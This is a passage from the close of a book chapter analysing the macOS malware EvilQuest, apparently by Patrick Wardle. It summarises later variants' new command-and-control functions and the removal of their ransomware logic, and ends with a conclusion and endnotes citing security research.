<p class="BodyFirst">Recall that the <code>react_ping</code> command expects a unique string from the server. If it receives this string, it returns a success. In the updated version of EvilQuest, this function now expects a different encrypted string: <code>"1D7KcC3J{Quo3lWNqs0FW6Vt0000023"</code>, which decrypts to “Hello Patrick” (<a href="#figure11-4" id="figureanchor11-4">Figure 11-4</a>).<sup class="endnote"><a href="#c11-endnote-9" id="c11-noteref-9">9</a></sup> </p>
<figure>
<img alt="A tweet from Myrtus (@Myrtus0x0) that says, “@patrickwardle think you’re getting called out my man” and has a picture attached of EvilQuest’s encrypted string decrypting to “Hello Patrick.”" class="keyline" src="image_fi/501942c11/f11004.png"/>
<figcaption><p><a id="figure11-4">Figure 11-4</a>: An interesting observation</p></figcaption>
</figure>
<p>Apparently the EvilQuest authors were fans of my early “OSX.EvilQuest Uncovered” blog posts!<sup class="endnote"><a href="#c11-endnote-10" id="c11-noteref-10">10</a></sup></p>
<h3 id="h2-501942c11-0026"><span epub:type="pagebreak" id="Page_281" title="281"/>Better Functions</h3>
<p class="BodyFirst">Other updates include improvements to older functions, particularly those that weren’t fully implemented as well as many new functions:</p>
<ul>
<li><code>react_updatesettings</code>: Used for retrieving updated settings from the command and control server</li>
<li><code>ei_rfind_cnc</code> and <code>ei_getip</code>: Generates pseudo-random IP addresses that will be used as the command and control server if they’re reachable</li>
<li><code>run_audio</code> and <code>run_image</code>: First saves an audio or image file from the server into a hidden file and then runs the <code>open</code> command to open the file with the default applications associated with the file</li>
</ul>
<h3 id="h2-501942c11-0027">Removed Ransomware Logic</h3>
<p class="BodyFirst">Interestingly the Trend Micro researchers also noted that a later version of EvilQuest removed its ransomware logic. This may not be too surprising; recall that the ransomware logic was flawed, allowing users to recover encrypted files without having to pay the ransom. Moreover, it appeared that the malware authors reaped no financial gains from this scheme. Phil Stokes wrote that “the one known Bitcoin address common to all the samples has had exactly zero transactions.”<sup class="endnote"><a href="#c11-endnote-11" id="c11-noteref-11">11</a></sup></p>
<p>In their report, the Trend Micro researchers argue that the malware authors are likely to release new versions of EvilQuest: </p>
<blockquote class="review">
<p class="Blockquote">Newer variants of [the EvilQuest malware] with more capabilities are released within days. Having observed this, we can assume that the threat actors behind the malware still have many plans to improve it. Potentially, they could be preparing to make it an even more vicious threat. In any case, it is certain that these threat actors act fast, whatever their plans. Security researchers should be reminded of this and strive to keep up with the malware’s progress by continuously detecting and blocking whatever variants cybercriminals come up with.<sup class="endnote"><a href="#c11-endnote-12" id="c11-noteref-12">12</a></sup></p></blockquote>
<p>As a result, we’re likely to see more from EvilQuest! </p>
<h2 id="h1-501942c11-0008">Conclusion</h2>
<p class="BodyFirst">EvilQuest is an insidious multifaceted threat, armed with anti-analysis mechanisms aimed at thwarting any scrutiny. However, as illustrated in the previous chapter, once such mechanisms are identified, they are rather trivial to wholly circumvent. </p>
<p>With the malware’s anti-analysis efforts defeated, in this chapter we turned to a myriad of static and dynamic analysis approaches to uncover <span epub:type="pagebreak" id="Page_282" title="282"/>the malware’s persistence mechanisms and gain a comprehensive understanding of its viral infection capabilities, file exfiltration logic, remote tasking capabilities, and ransomware logic.</p>
<p>In the process, we highlighted how to effectively utilize, in conjunction, arguably the two most powerful tools available to any malware analyst: the disassembler and the debugger. Against these tools, the malware stood no chance!</p>
<h2 id="h1-501942c11-0009">Endnotes</h2>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-1" id="c11-endnote-1">1</a></sup>	“Kernel Queues: An Alternative to File System Events,” <em>Apple Developer Documentation Archive</em>, <a class="LinkURL" href="https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/FSEvents_ProgGuide/KernelQueues/KernelQueues.html">https://developer.apple.com/library/archive/documentation/Darwin/Conceptual/FSEvents_ProgGuide/KernelQueues/KernelQueues.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-2" id="c11-endnote-2">2</a></sup>	Peter Szor, <em>The Art of Computer Virus Research and Defense</em> (Addison-Wesley Professional, 2005), <i>https://www.amazon.com/Art-Computer-Virus-Research-Defense/dp/0321304543/</i>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-3" id="c11-endnote-3">3</a></sup>	Patrick Wardle, “Writing Bad @$$ Malware for OS X,” <a class="LinkURL" href="https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-4" id="c11-endnote-4">4</a></sup>	“CGEventTapCreate,” <em>Apple Developer Documentation</em>, <a class="LinkURL" href="https://developer.apple.com/documentation/coregraphics/1454426-cgeventtapcreate/">https://developer.apple.com/documentation/coregraphics/1454426-cgeventtapcreate/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-5" id="c11-endnote-5">5</a></sup>	Phil Stokes, “‘EvilQuest’ Rolls Ransomware, Spyware &amp; Data Theft Into One,” <em>SentinelOne blog</em>, July 8, 2020, <a class="LinkURL" href="https://www.sentinelone.com/blog/evilquest-a-new-macos-malware-rolls-ransomware-spyware-and-data-theft-into-one/">https://www.sentinelone.com/blog/evilquest-a-new-macos-malware-rolls-ransomware-spyware-and-data-theft-into-one/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-6" id="c11-endnote-6">6</a></sup>	Jason Reaves, “Breaking EvilQuest: Reversing a Custom macOS Ransomware File Encryption Routine,” <em>Sentinel Labs</em>, July 7, 2020, <a class="LinkURL" href="https://labs.sentinelone.com/breaking-evilquest-reversing-a-custom-macos-ransomware-file-encryption-routine/">https://labs.sentinelone.com/breaking-evilquest-reversing-a-custom-macos-ransomware-file-encryption-routine/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-7" id="c11-endnote-7">7</a></sup>	Gabrielle Joyce Mabutas, Luis Magisa, and Steven Du, “Updates on Quickly-Evolving ThiefQuest macOS Malware,” <em>Trend Micro</em>, July 17, 2020, <a class="LinkURL" href="https://www.trendmicro.com/en_us/research/20/g/updates-on-quickly-evolving-thiefquest-macos-malware.html">https://www.trendmicro.com/en_us/research/20/g/updates-on-quickly-evolving-thiefquest-macos-malware.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-8" id="c11-endnote-8">8</a></sup>	Mabutas et al., “Updates on Quickly-Evolving ThiefQuest macOS Malware.”</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-9" id="c11-endnote-9">9</a></sup>	@Myrtus0x0, <em>Twitter</em>, July 7, 2020, <a class="LinkURL" href="https://twitter.com/Myrtus0x0/status/1280648821077401600/">https://twitter.com/Myrtus0x0/status/1280648821077401600/</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-10" id="c11-endnote-10">10</a></sup>	Patrick Wardle, “OSX.EvilQuest Uncovered (part I),” <em>Objective-See</em>, June 29, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x59.html">https://objective-see.com/blog/blog_0x59.html</a>, and “OSX.EvilQuest Uncovered (part II),” <em>Objective-See</em>, July 3, 2020, <a class="LinkURL" href="https://objective-see.com/blog/blog_0x60.html">https://objective-see.com/blog/blog_0x60.html</a>.</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-11" id="c11-endnote-11">11</a></sup>	Stokes, “‘EvilQuest’ Rolls Ransomware, Spyware &amp; Data Theft Into One.”</p></aside>
<aside class="endnote" epub:type="rearnote"><p>	<sup class="endnote"><a href="#c11-noteref-12" id="c11-endnote-12">12</a></sup>	Mabutas et al., “Updates on Quickly-Evolving ThiefQuest macOS Malware.”</p></aside>
</section>
</body>
</html>